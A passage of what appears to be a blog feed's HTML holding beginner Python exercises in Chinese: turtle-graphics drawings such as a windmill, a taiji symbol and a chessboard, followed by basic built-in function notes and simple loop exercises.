punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>speed<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">draw_circle</span><span class="token punctuation">(</span>color<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>goto<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>    t<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>color<span class="token punctuation">(</span>color<span class="token punctuation">)</span>    t<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>draw_circle<span class="token punctuation">(</span><span class="token string">'black'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>draw_circle<span class="token punctuation">(</span><span class="token string">'red'</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>draw_circle<span class="token punctuation">(</span><span class="token string">'blue'</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>draw_circle<span class="token punctuation">(</span><span class="token string">'green'</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="14-画发散线条"><a href="#14-画发散线条" class="headerlink" title="14.画发散线条"></a>14.画发散线条</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle <span class="token keyword">as</span> t<span class="token keyword">import</span> randomt<span class="token punctuation">.</span>setup<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>colormode<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">72</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    red <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span>    green <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span>    blue <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>color<span class="token punctuation">(</span>red<span class="token punctuation">,</span>green<span class="token punctuation">,</span>blue<span class="token punctuation">)</span>    t<span class="token punctuation">.</span>fd<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>lt<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">360</span><span class="token punctuation">)</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="15-画风车"><a href="#15-画风车" class="headerlink" title="15.画风车"></a>15.画风车</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle <span class="token keyword">as</span> tcolor_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'red'</span><span class="token punctuation">,</span><span class="token string">'yellow'</span><span class="token punctuation">,</span><span class="token string">'blue'</span><span class="token punctuation">,</span><span class="token string">'green'</span><span class="token punctuation">]</span><span class="token comment">#               0      1        2      3</span>t<span class="token punctuation">.</span>setup<span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">600</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>color<span class="token punctuation">(</span><span class="token string">'black'</span><span class="token punctuation">,</span>color_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>lt<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="16-画四色圆"><a href="#16-画四色圆" class="headerlink" title="16.画四色圆"></a>16.画四色圆</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle <span class="token keyword">as</span> tcolor_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'red'</span><span class="token punctuation">,</span><span class="token string">'yellow'</span><span class="token punctuation">,</span><span class="token string">'blue'</span><span class="token punctuation">,</span><span class="token string">'green'</span><span class="token punctuation">]</span><span class="token comment">#               0      1        2      3</span>t<span class="token punctuation">.</span>setup<span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">600</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>color<span class="token punctuation">(</span><span class="token string">'black'</span><span class="token punctuation">,</span>color_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>lt<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>rt<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="17-画奔驰车标"><a href="#17-画奔驰车标" class="headerlink" title="17.画奔驰车标"></a>17.画奔驰车标</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle <span class="token keyword">as</span> tt<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>color<span class="token punctuation">(</span><span class="token string">'red'</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>lt<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>lt<span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="18-画同心三角形"><a href="#18-画同心三角形" class="headerlink" title="18.画同心三角形"></a>18.画同心三角形</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle <span class="token keyword">as</span> t<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>circle<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">360</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span>i<span class="token punctuation">)</span>    t<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="19-画圆锥"><a href="#19-画圆锥" class="headerlink" title="19.画圆锥"></a>19.画圆锥</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle <span class="token keyword">as</span> t<span class="token keyword">import</span> randomt<span class="token punctuation">.</span>speed<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>colormode<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">+</span>i<span class="token punctuation">,</span><span class="token number">100</span><span class="token operator">-</span>i<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token comment"># t.fillcolor(random.randint(0,255),random.randint(0,255),random.randint(0,255))</span>    <span class="token comment"># 移动位置</span>    t<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span>i<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 画圆</span>    t<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>circle<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">360</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="20-画扇子"><a href="#20-画扇子" class="headerlink" title="20.画扇子"></a>20.画扇子</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle <span class="token keyword">as</span> tt<span class="token punctuation">.</span>speed<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">'yellow'</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">250</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>lt<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">250</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>home<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>color<span class="token punctuation">(</span><span class="token string">'red'</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>lt<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">250</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="21-画太极"><a href="#21-画太极" class="headerlink" title="21.画太极"></a>21.画太极</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle <span class="token keyword">as</span> tt<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>speed<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">200</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">'black'</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>dot<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>dot<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token string">'white'</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="13-画棋盘格"><a href="#13-画棋盘格" class="headerlink" title="13.画棋盘格"></a>13.画棋盘格</h3><p>利用Python中自带Turtle库绘制如下黑白棋盘。要求：画布大小宽800高600，窗体显示500<em>500，初始位置在（300,300），画出如下10</em>10的黑白格子，每个格子大小为50*50</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle <span class="token keyword">as</span> tt<span class="token punctuation">.</span>screensize<span class="token punctuation">(</span><span class="token number">800</span><span class="token punctuation">,</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token string">'white'</span><span class="token punctuation">)</span> <span class="token comment"># 设置画布宽、高、背景颜色</span>t<span class="token punctuation">.</span>speed<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># 设置海龟的速度,0是最快</span><span class="token comment"># 让海龟去x,y坐标点</span><span class="token keyword">def</span> <span class="token function">goto</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>goto<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>    t<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 画一个正方形</span><span class="token keyword">def</span> <span class="token function">draw_zhengfang</span><span class="token punctuation">(</span>color<span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>color<span class="token punctuation">(</span><span class="token string">'black'</span><span class="token punctuation">,</span>color<span class="token punctuation">)</span>    t<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        t<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        t<span class="token punctuation">.</span>lt<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>goto<span class="token punctuation">(</span><span class="token number">250</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">250</span><span class="token punctuation">)</span>count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">250</span><span class="token punctuation">,</span><span class="token number">250</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">250</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">250</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        goto<span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>        <span class="token keyword">if</span> count<span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>            draw_zhengfang<span class="token punctuation">(</span><span class="token string">'white'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            draw_zhengfang<span class="token punctuation">(</span><span class="token string">'black'</span><span class="token punctuation">)</span>        count <span class="token operator">+=</span> <span class="token number">1</span>    count<span class="token operator">+=</span><span class="token number">1</span>t<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>廖老师Python题目整理</title>
      <link href="/2022/10/17/%E5%BB%96%E8%80%81%E5%B8%88Python%E9%A2%98%E7%9B%AE%E6%95%B4%E7%90%86/"/>
      <url>/2022/10/17/%E5%BB%96%E8%80%81%E5%B8%88Python%E9%A2%98%E7%9B%AE%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p><code>声明：所有资料都是从廖老师那里搬运来的，本人就是整理下方便大家复习，感谢廖老师的辛苦付出</code></p><h2 id="一、知识点整理"><a href="#一、知识点整理" class="headerlink" title="一、知识点整理"></a>一、知识点整理</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> mathmath<span class="token punctuation">.</span>sqrt<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span>   <span class="token comment"># 求（）的平方根，答案为5</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span>        <span class="token comment"># 求（）的ASCLL码值，答案为65，注：'a'的ASCLL码为97</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#求（）的长度，答案为6，注：空列表也算一个元素</span><span class="token builtin">pow</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>n<span class="token punctuation">)</span>  <span class="token comment">#求x的n次方，注：等同于幂运算符x**2</span><span class="token builtin">abs</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">76</span><span class="token punctuation">)</span>  <span class="token comment">#求（）的绝对值，答案为76</span>math<span class="token punctuation">.</span>cos<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token comment">#求cosx的值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、循环"><a href="#二、循环" class="headerlink" title="二、循环"></a>二、循环</h2><h3 id="1-求1-100的所有数的和"><a href="#1-求1-100的所有数的和" class="headerlink" title="1.求1-100的所有数的和"></a>1.求1-100的所有数的和</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">sum</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment"># 累加和</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">sum</span><span class="token operator">+=</span>i<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'1-100的所有整数之和为:'</span><span class="token punctuation">,</span><span class="token builtin">sum</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-输出-1-100-之间的所有偶数"><a href="#2-输出-1-100-之间的所有偶数" class="headerlink" title="2.输出 1-100 之间的所有偶数"></a>2.输出 1-100 之间的所有偶数</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#遍历1-100的整数</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 如果i可以被2整除、则打印</span>    <span class="token keyword">if</span> i<span class="token operator">%</span><span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-求1-2-3-4-5-…-99的所有数的和"><a href="#3-求1-2-3-4-5-…-99的所有数的和" class="headerlink" title="3.求1-2+3-4+5 … 99的所有数的和"></a>3.求1-2+3-4+5 … 99的所有数的和</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">sum</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment"># 累加和</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 如果i是奇数、则相加</span>    <span class="token keyword">if</span> i<span class="token operator">%</span><span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token builtin">sum</span><span class="token operator">+=</span>i  <span class="token comment"># 完整形式：sum = sum + i</span>    <span class="token comment"># 否则i就是偶数、则相减</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token builtin">sum</span><span class="token operator">-=</span>i  <span class="token comment"># sum = sum - i</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-打印1-100之间除了含7和7的倍数以外的数字"><a href="#4-打印1-100之间除了含7和7的倍数以外的数字" class="headerlink" title="4.打印1-100之间除了含7和7的倍数以外的数字"></a>4.打印1-100之间除了含7和7的倍数以外的数字</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 如果不是7的倍数、则打印</span>    <span class="token keyword">if</span> i<span class="token operator">%</span><span class="token number">7</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-编写程序用户登录程序且仅有三次机会"><a href="#5-编写程序用户登录程序且仅有三次机会" class="headerlink" 